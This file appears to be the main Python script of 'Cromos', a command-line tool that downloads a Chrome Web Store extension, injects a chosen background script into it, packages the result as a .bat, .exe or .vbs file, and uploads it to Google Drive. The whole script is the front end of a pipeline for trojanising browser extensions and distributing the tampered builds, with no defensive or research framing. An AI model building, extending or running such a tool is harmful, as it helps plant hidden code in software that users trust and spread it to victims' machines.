#!/usr/bin/python

import argparse
import sys
import libs.crx
from libs.crx import Cromos
from libs.drive import Drive
from libs.build import Build
from libs.loader import Loader

class Color:

    header = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    warning = '\033[93m'
    fail = '\033[91m'
    endc = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'

def Banner() : 

	Banner = """
         (         )      *         )    (     
   (     )\ )   ( /(    (  `     ( /(    )\ )  
   )\   (()/(   )\())   )\))(    )\())  (()/(  
 (((_)   /(_)) ((_)\   ((_)()\  ((_)\    /(_)) 
 )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
 | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
  \___| |_|_\   \___/  |_|  |_|  \___/  |___/
 """
	print("{}".format(Color.warning + Banner + Color.endc))
	print("  Version: {} Builds: {} Modules: {}\n".format("1.0","3", "2"))

def Help () :

	global extension, build, apikey, module

	parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
	parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, default="", required=True)
	parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
	parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
	parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)

	args = parser.parse_args()

	extension = args.extension # Extensao ID
	build = args.build # Tipo do arquivo que devera ser gerado apos os injections
	apikey = args.key # API key par ao dropbox
	module = args.load # Pasta de saida para os arquivos

	if len(sys.argv) <= 2 :
		parser.print_help()
		

if __name__== "__main__" :

	Banner()
	Help()

	cromos = Cromos(extension)
	
	if cromos.valid():

		print(Color.green + "[+]" + Color.endc + " Download the CRX {} ...".format(extension))
		cromos.download()
		cromos.unpack()

		print(Color.green + "[+]" + Color.endc + " Loading the module {}".format(module))
		loader = Loader(module).inject()

		print(Color.warning + "[!]" + Color.endc + " Creating executable file in output/builds/{}.{} ...".format(extension, build))
		build = Build(extension, build).Builder()

		cromos.extract()
		print(Color.warning + "[!]" + Color.endc +  " Extension directory output/extension/{}".format(extension))

		print(Color.green + "[+]" + Color.endc + " Upload files in the Google Drive ...")
		drive = Drive(extension, apikey)
		print(Color.green + "[+]" + Color.endc + " Well, it's okay! ") 